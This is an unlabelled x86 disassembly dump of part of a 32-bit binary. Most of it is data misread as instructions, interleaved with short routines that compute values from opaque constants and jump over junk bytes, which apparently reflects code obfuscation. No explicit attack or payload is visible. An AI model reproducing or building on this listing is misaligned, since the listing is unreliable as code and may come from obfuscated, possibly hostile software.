  41f438:	pop    esi
  41f439:	frstor [eax+0x30]
  41f43c:	retf   
  41f43d:	mov    bl,0x4d
  41f43f:	jg     0x41f410
  41f441:	xchg   ebp,eax
  41f442:	iret   
  41f443:	ret    
  41f444:	and    ebp,DWORD PTR [edx-0x680be7c]
  41f44a:	into   
  41f44b:	in     eax,0x94
  41f44d:	add    BYTE PTR [ebp-0x7d950550],cl
  41f453:	add    eax,0xbe7684c5
  41f458:	push   ecx
  41f459:	retf   0x516a
  41f45c:	push   edi
  41f45d:	push   ebx
  41f45e:	test   eax,0x334d8f32
  41f463:	loop   0x41f409
  41f465:	sub    DWORD PTR ds:0x53b27d04,edi
  41f46b:	mov    ds:0xb5efd097,al
  41f470:	je     0x41f467
  41f472:	or     BYTE PTR [ebx],ah
  41f474:	jb     0x41f4d6
  41f476:	cli    
  41f477:	scas   eax,DWORD PTR es:[edi]
  41f478:	xchg   BYTE PTR [ecx+0x28],dl
  41f47b:	dec    ecx
  41f47c:	test   BYTE PTR [ecx-0x77],dl
  41f47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f480:	(bad)  
  41f481:	adc    al,0x93
  41f483:	mov    ebx,0xb0341b83
  41f488:	std    
  41f489:	ss jnp 0x41f441
  41f48c:	adc    bl,dl
  41f48e:	or     eax,0x84352f9
  41f493:	es xchg esp,eax
  41f495:	aaa    
  41f496:	cwde   
  41f497:	jb     0x41f4ee
  41f499:	jmp    0x618e:0xd37c2e46
  41f4a0:	int    0x75
  41f4a2:	xchg   edx,eax
  41f4a3:	fiadd  DWORD PTR [eax+ebp*8-0x5519292a]
  41f4aa:	jo     0x41f4e6
  41f4ac:	icebp  
  41f4ad:	retf   
  41f4ae:	int    0xee
  41f4b0:	(bad)  
  41f4b1:	es push esi
  41f4b3:	int3   
  41f4b4:	mov    dl,BYTE PTR [edx+ebx*8+0xa17e657]
  41f4bb:	xor    DWORD PTR [eax+ebx*8-0x4a],ecx
  41f4bf:	loopne 0x41f4cc
  41f4c1:	sbb    BYTE PTR [ebx-0x68],0xaf
  41f4c5:	jbe    0x41f4e4
  41f4c7:	xchg   ebp,eax
  41f4c8:	scas   al,BYTE PTR es:[edi]
  41f4c9:	inc    edx
  41f4ca:	fild   QWORD PTR [eax+0x2334a8df]
  41f4d0:	imul   esi,DWORD PTR [edx+edx*1-0x23],0xffffffd0
  41f4d5:	add    dl,dl
  41f4d7:	mov    edx,0x3ce8fc75
  41f4dc:	add    BYTE PTR [esi],dh
  41f4de:	mov    DWORD PTR [ebx-0x3bcac195],edi
  41f4e4:	ins    BYTE PTR es:[edi],dx
  41f4e5:	scas   eax,DWORD PTR es:[edi]
  41f4e6:	imul   esp,DWORD PTR [edi],0x6523ac0e
  41f4ec:	adc    eax,0xc794a4bf
  41f4f1:	inc    esi
  41f4f2:	dec    eax
  41f4f3:	test   DWORD PTR [edi],ebp
  41f4f5:	out    0x8c,al
  41f4f7:	repz jbe 0x41f508
  41f4fa:	mov    dl,0x3f
  41f4fc:	or     ebx,ecx
  41f4fe:	je     0x41f56d
  41f500:	dec    ebx
  41f501:	pop    es
  41f502:	hlt    
  41f503:	cmp    esi,DWORD PTR ds:0x43cadddd
  41f509:	xchg   esi,eax
  41f50a:	ja     0x41f55b
  41f50c:	dec    esp
  41f50d:	sub    DWORD PTR [edi],esi
  41f50f:	fisttp WORD PTR [ecx+0x495404a9]
  41f515:	std    
  41f516:	mov    edi,0x661f3430
  41f51b:	push   0x45
  41f51d:	adc    DWORD PTR [eax-0x1f29fc9c],ebp
  41f523:	leave  
  41f524:	add    eax,0x76cd1dcd
  41f529:	aas    
  41f52a:	and    ebp,edx
  41f52c:	mov    edi,0xbef91627
  41f531:	pop    ebx
  41f532:	daa    
  41f533:	ds add al,0xc9
  41f536:	iret   
  41f537:	or     eax,0xf82f6232
  41f53c:	hlt    
  41f53d:	pop    esp
  41f53e:	cli    
  41f53f:	mov    DWORD PTR [edx+0x4dccb6bc],ebx
  41f545:	shl    DWORD PTR [ebp-0x33df346c],1
  41f54b:	push   ss
  41f54c:	clc    
  41f54d:	xchg   esi,eax
  41f54e:	js     0x41f557
  41f550:	aaa    
  41f551:	aam    0x6b
  41f553:	in     eax,0xdc
  41f555:	retf   
  41f556:	push   ebp
  41f557:	mov    ?,WORD PTR [esp+ecx*8-0x30]
  41f55b:	push   edi
  41f55c:	mul    BYTE PTR es:[edi+0x5cce9f4d]
  41f563:	push   edx
  41f564:	dec    DWORD PTR [edx-0x60deacdd]
  41f56a:	fist   WORD PTR [ebx]
  41f56c:	add    BYTE PTR [esi-0x39],bh
  41f56f:	repz aad 0xfa
  41f572:	add    bl,BYTE PTR [edi+0xe]
  41f575:	lea    eax,[ebx+0x2]
  41f578:	cld    
  41f579:	fdivr  QWORD PTR ds:0xf621c821
  41f57f:	mov    ebx,0xba074fde
  41f584:	mov    eax,ds:0x7dc10e2b
  41f589:	jmp    0xc5446716
  41f58e:	mov    edx,esp
  41f590:	pusha  
  41f591:	repz push cs
  41f593:	pop    ebp
  41f594:	mov    ecx,DWORD PTR [ebp-0xdc]
  41f59a:	and    eax,ecx
  41f59c:	add    eax,DWORD PTR [ebp-0x44]
  41f59f:	mov    ecx,DWORD PTR [ebp-0xe0]
  41f5a5:	lea    eax,[eax+ecx*1+0x272f]
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	jno    0x41f605
  41f668:	and    al,0x9e
  41f66a:	dec    esp
  41f66b:	test   eax,eax
  41f66d:	mov    esi,0xbebec44a
  41f672:	dec    eax
  41f673:	jns    0x41f6c9
  41f675:	mov    edi,DWORD PTR [ebp+edx*4+0x159a960d]
  41f67c:	push   es
  41f67d:	add    ch,BYTE PTR [ebp-0x51]
  41f680:	mov    ch,0xdb
  41f682:	retf   0x3467
  41f685:	mov    dl,0x9
  41f687:	adc    al,0x38
  41f689:	nop
  41f68a:	ins    BYTE PTR es:[edi],dx
  41f68b:	rol    ah,cl
  41f68d:	clc    
  41f68e:	(bad)  
  41f68f:	pop    ss
  41f690:	enter  0xd3b1,0xdd
  41f694:	mov    esi,0x126982cb
  41f699:	xchg   ebp,eax
  41f69a:	imul   ecx,DWORD PTR fs:[ebp+0x7f],0x8c6f5f58
  41f6a2:	adc    ebp,eax
  41f6a4:	mov    WORD PTR [eax-0x4c],es
  41f6a7:	mov    al,ds:0xda1d4356
  41f6ac:	push   0x5
  41f6ae:	jnp    0x41f6f5
  41f6b0:	outs   dx,BYTE PTR ds:[esi]
  41f6b1:	pop    edx
  41f6b2:	test   eax,0xfa3df2d2
  41f6b7:	js     0x41f680
  41f6b9:	es (bad) 
  41f6bc:	test   edx,ebp
  41f6be:	test   dh,bh
  41f6c0:	jle    0x41f65d
  41f6c2:	add    eax,0xbd64b766
  41f6c7:	push   ds
  41f6c8:	iret   
  41f6c9:	adc    ebx,DWORD PTR [esi]
  41f6cb:	ins    BYTE PTR es:[edi],dx
  41f6cc:	mov    edi,0xd6fc7d6f
  41f6d1:	lock pop ss
  41f6d3:	xor    eax,0xd6d6f6f6
  41f6d8:	sbb    DWORD PTR [esi-0x12321d18],esp
  41f6de:	inc    esi
  41f6df:	fcmovbe st,st(3)
  41f6e1:	mov    ch,0x1a
  41f6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e4:	pusha  
  41f6e5:	cmc    
  41f6e6:	xchg   esi,eax
  41f6e7:	(bad)  
  41f6e8:	loope  0x41f6ec
  41f6ea:	sbb    eax,0x2921cfad
  41f6ef:	inc    eax
  41f6f0:	fisttp QWORD PTR [esi+0x2f99ae5f]
  41f6f6:	int3   
  41f6f7:	jae    0xda0465da
  41f6fd:	sub    al,0xa4
  41f6ff:	add    al,0x85
  41f701:	scas   al,BYTE PTR es:[edi]
  41f702:	mov    bh,BYTE PTR [ecx+ecx*4+0x1c]
  41f706:	mov    esi,DWORD PTR [ebx]
  41f708:	aam    0x7b
  41f70a:	shr    BYTE PTR [eax+0x7a],cl
  41f70d:	call   0xb37e:0x13ae4b9
  41f714:	sub    DWORD PTR [edi],eax
  41f716:	rcr    DWORD PTR [edx+0x1e803574],1
  41f71c:	lods   al,BYTE PTR ds:[esi]
  41f71d:	mov    eax,0x8b3bf8af
  41f722:	popf   
  41f723:	cmp    edx,ebx
  41f725:	pop    ebx
  41f726:	adc    eax,0x9cbc5527
  41f72b:	dec    eax
  41f72c:	add    eax,ecx
  41f72e:	repnz xchg edi,eax
  41f730:	ret    
  41f731:	lock pop esp
  41f733:	jb     0x41f76e
  41f735:	sar    DWORD PTR [eax],cl
  41f737:	ins    BYTE PTR es:[edi],dx
  41f738:	xchg   edi,eax
  41f739:	les    esp,FWORD PTR [ebx]
  41f73b:	and    cl,dl
  41f73d:	loop   0x41f6f5
  41f73f:	or     esp,ebp
  41f741:	test   eax,0x397657d9
  41f746:	or     al,ch
  41f748:	jns    0x41f716
  41f74a:	lods   al,BYTE PTR fs:[esi]
  41f74c:	mov    dh,0x34
  41f74e:	adc    BYTE PTR [ebx-0x2a7b2d3a],dh
  41f754:	inc    edx
  41f755:	lahf   
  41f756:	mov    edx,0x5ebf392e
  41f75b:	stos   DWORD PTR es:[edi],eax
  41f75c:	out    dx,al
  41f75d:	add    eax,0x826ccbdc
  41f762:	sbb    DWORD PTR [ebx+0x26],0xb81e3825
  41f769:	data16 xor al,0xf6
  41f76c:	gs or  esp,ebx
  41f76f:	sub    bh,0x5c
  41f772:	push   edi
  41f773:	dec    edi
  41f774:	cld    
  41f775:	(bad)  
  41f776:	jo     0x41f77f
  41f778:	cwde   
  41f779:	fimul  DWORD PTR [esi+0x2b06037]
  41f77f:	fcom   QWORD PTR gs:[eax*1-0x7d422096]
  41f787:	and    DWORD PTR [eax+eiz*2-0x39],0xa4483d0
  41f78f:	jbe    0x41f7e2
  41f791:	repnz add ah,BYTE PTR [ebx]
  41f794:	cli    
  41f795:	mov    edi,0x2c4f2ae3
  41f79a:	xchg   esp,eax
  41f79b:	retf   
  41f79c:	mov    al,ds:0xc3f5565d
  41f7a1:	jae    0x41f762
  41f7a3:	aas    
  41f7a4:	jp     0x41f7be
  41f7a6:	in     al,dx
  41f7a7:	fsub   QWORD PTR [esi]
  41f7a9:	test   eax,0xb559539b
  41f7ae:	add    esp,DWORD PTR [esi]
  41f7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7b1:	ss jb  0x41f7da
  41f7b4:	dec    ecx
  41f7b5:	xchg   edi,eax
  41f7b6:	ds or  eax,0xe3678d7c
  41f7bc:	data16 mov WORD PTR [eax-0xdd7df23],es
  41f7c3:	call   0x30900190
  41f7c8:	pop    ebx
  41f7c9:	les    eax,FWORD PTR gs:[edx-0x51]
  41f7cd:	das    
  41f7ce:	mov    al,ds:0x79ec5b5c
  41f7d3:	fild   QWORD PTR [edx+edx*8]
  41f7d6:	mov    eax,0xadd36dd8
  41f7db:	mov    bh,bl
  41f7dd:	(bad)  
  41f7de:	test   eax,0x204448c1
  41f7e3:	(bad)  
  41f7e4:	fst    QWORD PTR [esi-0x47]
  41f7e7:	lods   eax,DWORD PTR ds:[esi]
  41f7e8:	cli    
  41f7e9:	das    
  41f7ea:	mov    edx,0xfd62e2f
  41f7ef:	and    al,0x14
  41f7f1:	xchg   edx,ecx
  41f7f3:	cmp    DWORD PTR ds:0xdb78fb11,ecx
  41f7f9:	dec    eax
  41f7fa:	sbb    ebp,ecx
  41f7fc:	push   0x63f9af76
  41f801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f802:	push   es
  41f803:	jle    0x41f87d
  41f805:	in     eax,dx
  41f806:	mov    DWORD PTR [eax+0x231561f9],esi
  41f80c:	add    eax,0xc3b1b265
  41f811:	hlt    
  41f812:	mov    ch,0x8c
  41f814:	add    al,0xd
  41f816:	outs   dx,BYTE PTR ds:[esi]
  41f817:	and    ebp,ecx
  41f819:	int    0xac
  41f81b:	or     al,0x5d
  41f81d:	push   esi
  41f81e:	mov    ebx,0x8c3c6d28
  41f823:	in     eax,0x31
  41f825:	sbb    BYTE PTR [ebx-0x571f2f8f],bh
  41f82b:	outs   dx,BYTE PTR ds:[esi]
  41f82c:	jg     0x41f8a0
  41f82e:	jo     0x41f895
  41f830:	dec    ebp
  41f831:	rol    DWORD PTR ds:0xc548872d,1
  41f837:	mov    ebp,0x8d159c6b
  41f83c:	mov    edx,edi
  41f83e:	cmp    BYTE PTR [ecx+0x78db6a8a],cl
  41f844:	pop    edi
  41f845:	inc    ebp
  41f846:	bound  esi,QWORD PTR [edx+0x54]
  41f849:	std    
  41f84a:	pusha  
  41f84b:	jne    0x41f878
  41f84d:	xchg   esp,eax
  41f84e:	jne    0x41f889
  41f850:	ss xchg edx,eax
  41f852:	sub    eax,0xd7266c75
  41f857:	inc    ebp
  41f858:	add    al,0x93
  41f85a:	fisub  DWORD PTR [ecx]
  41f85c:	bound  esi,QWORD PTR [ecx+0x48]
  41f85f:	ins    BYTE PTR es:[edi],dx
  41f860:	xchg   edi,eax
  41f861:	xor    dh,BYTE PTR [ebp+0x46]
  41f864:	adc    eax,0xf376af91
  41f869:	dec    ebp
  41f86a:	or     BYTE PTR [edi+0x14fbbeb4],dh
  41f870:	les    esi,FWORD PTR [ebx]
  41f872:	xor    eax,0x3ef8935f
  41f877:	mov    dh,0xc2
  41f879:	and    al,0xa4
  41f87b:	sar    DWORD PTR [ebx+0x13],0x75
  41f87f:	push   ecx
  41f880:	pop    ds
  41f881:	es add eax,0xe6dedf32
  41f887:	jg     0x41f895
  41f889:	(bad)  
  41f88a:	adc    ecx,edx
  41f88c:	mov    al,ds:0xb464f34a
  41f891:	lock dec esi
  41f893:	popf   
  41f894:	sub    al,bh
  41f896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f897:	test   DWORD PTR [ebp+0x4f8da394],ebp
  41f89d:	jae    0x41f8d4
  41f89f:	fdiv   QWORD PTR [edx]
  41f8a1:	and    al,0xc
  41f8a3:	mov    DWORD PTR [ebx-0x7f9a8a06],eax
  41f8a9:	std    
  41f8aa:	(bad)  
  41f8ab:	sub    eax,0x489cb1e2
  41f8b0:	out    0x27,eax
  41f8b2:	jp     0x41f83b
  41f8b4:	shr    BYTE PTR [ebx],0x24
  41f8b7:	xlat   BYTE PTR ds:[ebx]
  41f8b8:	aam    0x52
  41f8ba:	xchg   BYTE PTR [ecx+0x2cf7cac4],ch
  41f8c0:	mov    dl,0x8
  41f8c2:	(bad)  
  41f8c3:	jae    0x41f8c8
  41f8c5:	test   DWORD PTR [ebx],esp
  41f8c7:	in     eax,dx
  41f8c8:	jp     0x41f86c
  41f8ca:	push   edi
  41f8cb:	add    eax,0x8e52181e
  41f8d0:	pop    ebp
  41f8d1:	int    0x96
  41f8d3:	lock cs hlt 
  41f8d6:	jbe    0x41f93c
  41f8d8:	(bad)  
  41f8d9:	cs jns 0x41f8a5
  41f8dc:	aas    
  41f8dd:	jg     0x41f8af
  41f8df:	or     DWORD PTR [esi+ebp*2],esp
  41f8e2:	cs jns 0x41f872
  41f8e5:	div    BYTE PTR [edx+0x79956f69]
  41f8eb:	pusha  
  41f8ec:	test   eax,0x8b3e0572
  41f8f1:	retf   
  41f8f2:	out    0x4c,al
  41f8f4:	mov    esp,0xc1241523
  41f8f9:	mov    bl,0x15
  41f8fb:	cli    
  41f8fc:	adc    ebp,DWORD PTR [edi]
  41f8fe:	cmp    eax,0xe8f77cba
  41f903:	div    DWORD PTR [ecx+0x677675af]
  41f909:	ret    
  41f90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f90b:	and    eax,0x3ea4b23d
  41f910:	daa    
  41f911:	jmp    0x66abe8bc
  41f916:	xchg   ebx,eax
  41f917:	or     BYTE PTR [ecx+0x6f],0x81
  41f91b:	in     eax,0x51
  41f91d:	pop    esi
  41f91e:	mov    ch,0x35
  41f920:	push   edx
  41f921:	imul   esp,DWORD PTR [eax-0x384f5d55],0x7737aef9
  41f92b:	add    eax,0xea8aaa4f
  41f930:	push   esp
  41f931:	cwde   
  41f932:	aaa    
  41f933:	das    
  41f934:	mov    eax,ds:0xd7c50f34
  41f939:	(bad)  
  41f93a:	mov    edx,0x212b1f32
  41f93f:	icebp  
  41f940:	cmp    dh,BYTE PTR [eax+0x4e]
  41f943:	xchg   ebp,eax
  41f944:	mov    bl,0x3c
  41f946:	lock out dx,eax
  41f948:	add    dl,BYTE PTR [ebp+esi*4-0x76dee8b8]
  41f94f:	repz adc eax,0xc96b5f13
  41f955:	popa   
  41f956:	int    0x80
  41f958:	mov    al,0x64
  41f95a:	push   cs
  41f95b:	imul   edx,DWORD PTR [ebx+edx*1],0xffffffd9
  41f95f:	pusha  
  41f960:	xor    al,0x41
  41f962:	dec    edx
  41f963:	lahf   
  41f964:	jmp    0x41f9cf
  41f966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f967:	fnstsw WORD PTR [ebp-0x608a5d92]
  41f96d:	pop    ebx
  41f96e:	in     eax,0xf7
  41f970:	gs xchg edx,eax
  41f972:	cmp    eax,0x5f4c7442
  41f977:	inc    esi
  41f978:	mov    ch,0x19
  41f97a:	ror    esi,0x3b
  41f97d:	xchg   ebp,eax
  41f97e:	bound  ebx,QWORD PTR [edx]
  41f980:	lods   eax,DWORD PTR ds:[esi]
  41f981:	sub    bl,dh
  41f983:	int3   
  41f984:	scas   al,BYTE PTR es:[edi]
  41f985:	clc    
  41f986:	test   eax,0x6d8135da
  41f98b:	dec    eax
  41f98c:	cdq    
  41f98d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41f98f:	outs   dx,DWORD PTR ds:[esi]
  41f990:	stos   BYTE PTR es:[edi],al
  41f991:	cmp    DWORD PTR [ebp-0x49],eax
  41f994:	jnp    0x41f9cf
  41f996:	cmc    
  41f997:	cli    
  41f998:	jo     0x41f933
  41f99a:	mov    bl,0x7e
  41f99c:	aad    0x6f
  41f99e:	cs mov edi,0xa547e84d
  41f9a4:	jno    0x41f971
  41f9a6:	inc    edi
  41f9a7:	(bad)  
  41f9a8:	ds dec ebx
  41f9aa:	les    esp,FWORD PTR [edx-0x61252c33]
  41f9b0:	sub    BYTE PTR [edi],al
  41f9b2:	popa   
  41f9b3:	imul   ebx,DWORD PTR [ebp+ebx*1-0x71],0x37c308fb
  41f9bb:	pop    ds
  41f9bc:	sti    
  41f9bd:	jle    0x41f95c
  41f9bf:	gs push cs
  41f9c1:	cmp    cl,BYTE PTR [edx+0x23]
  41f9c4:	not    BYTE PTR [ebx+0x62]
  41f9c7:	adc    eax,0xfe424611
  41f9cc:	pusha  
  41f9cd:	jno    0x41f9fa
  41f9cf:	xchg   ecx,eax
  41f9d0:	inc    ebx
  41f9d1:	and    ebx,DWORD PTR [ecx*1-0x7676daa4]
  41f9d8:	ja     0x41f982
  41f9da:	xchg   ebp,eax
  41f9db:	fs (bad) 
  41f9dd:	xchg   edi,eax
  41f9de:	add    BYTE PTR [edx+0x3a],dh
  41f9e1:	mov    ebp,DWORD PTR [eax-0xebb6cf6]
  41f9e7:	fwait
  41f9e8:	std    
  41f9e9:	dec    ecx
  41f9ea:	aaa    
  41f9eb:	sbb    BYTE PTR [eax],bh
  41f9ed:	arpl   di,ax
  41f9ef:	xchg   esi,eax
  41f9f0:	retf   
  41f9f1:	push   edx
  41f9f2:	lock aaa 
  41f9f4:	pop    edi
  41f9f5:	fist   DWORD PTR [esi+0x2a]
  41f9f8:	data16 jp 0x41fa4c
  41f9fb:	or     eax,0xe73d0c0c
  41fa00:	add    eax,0xb649649f
  41fa05:	mov    bh,0xaf
  41fa07:	mov    bl,BYTE PTR [ebx-0x79587ae0]
  41fa0d:	sar    DWORD PTR [eax],cl
  41fa0f:	leave  
  41fa10:	xor    BYTE PTR [ecx],al
  41fa12:	jge    0x41f995
  41fa14:	(bad)  
  41fa15:	xor    eax,0x59cf011c
  41fa1a:	aad    0x6f
  41fa1c:	lods   al,BYTE PTR ds:[esi]
  41fa1d:	jle    0x41fa0c
  41fa1f:	fldcw  WORD PTR [esi+0x2438d79]
  41fa26:	fwait
  41fa27:	xor    BYTE PTR [ebx-0x20],bl
  41fa2a:	xchg   edx,eax
  41fa2b:	xchg   edi,eax
  41fa2c:	push   eax
  41fa2d:	or     DWORD PTR [esi+0x56eaf807],ebx
  41fa33:	stos   BYTE PTR es:[edi],al
  41fa34:	sub    ecx,DWORD PTR [eax+eax*4-0x1ba49e4]
  41fa3b:	pop    ebx
  41fa3c:	mov    edx,DWORD PTR [ebp-0x20]
  41fa3f:	xor    ecx,edx
  41fa41:	mov    edx,DWORD PTR [ebp-0x10c]
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	lods   eax,DWORD PTR ds:[esi]
  41fb63:	fadd   QWORD PTR [eax-0x3f722831]
  41fb69:	mov    esi,0xbebec44a
  41fb6e:	push   ebp
  41fb6f:	add    al,cl
  41fb71:	shr    DWORD PTR [edi],0x87
  41fb74:	xchg   edi,eax
  41fb75:	sbb    eax,0x69155e69
  41fb7a:	out    dx,al
  41fb7b:	ret    0xaec3
  41fb7e:	push   ebp
  41fb7f:	ret    0x9822
  41fb82:	in     eax,0xc3
  41fb84:	ficom  DWORD PTR [edx-0x771bebf2]
  41fb8a:	in     eax,0xac
  41fb8c:	sub    bl,BYTE PTR [eax-0x2e]
  41fb8f:	pushf  
  41fb90:	imul   ebx,DWORD PTR [edx+0x1f],0xffffff8d
  41fb94:	pop    esi
  41fb95:	cmp    BYTE PTR [esi],dl
  41fb97:	xor    ax,0x5b0
  41fb9b:	xchg   DWORD PTR [edx],ebx
  41fb9d:	jns    0x41fc0c
  41fb9f:	popa   
  41fba0:	mov    edi,0x50c5db09
  41fba5:	sbb    edx,DWORD PTR [edi+0x1a266eb4]
  41fbab:	pop    esp
  41fbad:	push   cs
  41fbae:	sbb    DWORD PTR [ecx+0x40],ecx
  41fbb1:	jno    0x41fba2
  41fbb3:	jnp    0x41fbff
  41fbb5:	adc    DWORD PTR [ebp-0x1126c373],ebp
  41fbbb:	pop    ss
  41fbbc:	rol    esi,1
  41fbbe:	dec    esi
  41fbbf:	sub    eax,0x4abed6f8
  41fbc4:	mov    eax,ds:0xb824178d
  41fbc9:	add    BYTE PTR [esi+0x1b],ah
  41fbcc:	dec    esp
  41fbcd:	loop   0x41fbe2
  41fbcf:	jge    0x41fc47
  41fbd1:	adc    BYTE PTR [ecx],0xe1
  41fbd4:	iret   
  41fbd5:	pop    ebx
  41fbd6:	jecxz  0x41fb6b
  41fbd8:	enter  0x7888,0x18
  41fbdc:	fsubrp st(2),st
  41fbde:	(bad)  
  41fbdf:	fimul  WORD PTR [esi+0x73bfc463]
  41fbe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbe6:	popa   
  41fbe7:	(bad)  
  41fbe9:	nop
  41fbea:	inc    esi
  41fbeb:	aaa    
  41fbec:	cmp    BYTE PTR [esi+0x3d],ch
  41fbef:	dec    edi
  41fbf0:	adc    al,0x4c
  41fbf2:	dec    eax
  41fbf3:	push   ebx
  41fbf4:	iret   
  41fbf5:	xchg   esp,eax
  41fbf6:	mov    esi,0x51d388a8
  41fbfb:	add    eax,0x169996b8
  41fc00:	or     DWORD PTR [ebx],esp
  41fc02:	mov    cs,WORD PTR [ebx]
  41fc04:	adc    BYTE PTR [edi+0x13f8761e],bh
  41fc0a:	sbb    bh,BYTE PTR [ebx+ebx*1]
  41fc0d:	push   esi
  41fc0e:	dec    esp
  41fc0f:	add    BYTE PTR [ebx+0x11018af7],0x89
  41fc16:	add    al,0x36
  41fc18:	inc    ecx
  41fc19:	out    0xbe,eax
  41fc1b:	lds    ecx,FWORD PTR [esi-0x23]
  41fc1e:	sub    eax,0x1ef73788
  41fc23:	call   0xa2c:0xd3b8f30
  41fc2a:	aaa    
  41fc2b:	fld    TBYTE PTR [edx]
  41fc2d:	pop    ebx
  41fc2e:	popf   
  41fc2f:	mov    ds:0xac99cefd,eax
  41fc34:	cmp    BYTE PTR [eax],al
  41fc36:	or     eax,0x6134a969
  41fc3b:	fsub   st,st(5)
  41fc3d:	or     eax,0x7c0e06d7
  41fc42:	lock fst QWORD PTR [ebp-0x742bb690]
  41fc49:	enter  0x9ce5,0x6
  41fc4d:	imul   ebx,DWORD PTR [esi-0x35],0xffffff91
  41fc51:	jb     0x41fc52
  41fc53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc54:	addr16 jl 0x41fc81
  41fc57:	or     al,0xea
  41fc59:	xor    BYTE PTR [edi+0x62],ch
  41fc5c:	(bad)  
  41fc5d:	xchg   edi,eax
  41fc5e:	and    cl,0x2d
  41fc61:	aad    0xd7
  41fc63:	cmp    al,0x80
  41fc65:	mov    edi,0x85bb0fbb
  41fc6a:	fiadd  DWORD PTR [ebx-0x79e5031e]
  41fc70:	fiadd  DWORD PTR [ebp+edi*1+0xc]
  41fc74:	jne    0x41fc95
  41fc76:	and    dl,dl
  41fc78:	out    dx,eax
  41fc79:	sbb    edi,DWORD PTR [edx-0x8]
  41fc7c:	jno    0x41fc4f
  41fc7e:	(bad)  [esi+0x1ff1b8ae]
  41fc84:	mov    ds:0x1f5fbded,eax
  41fc89:	xchg   ebp,eax
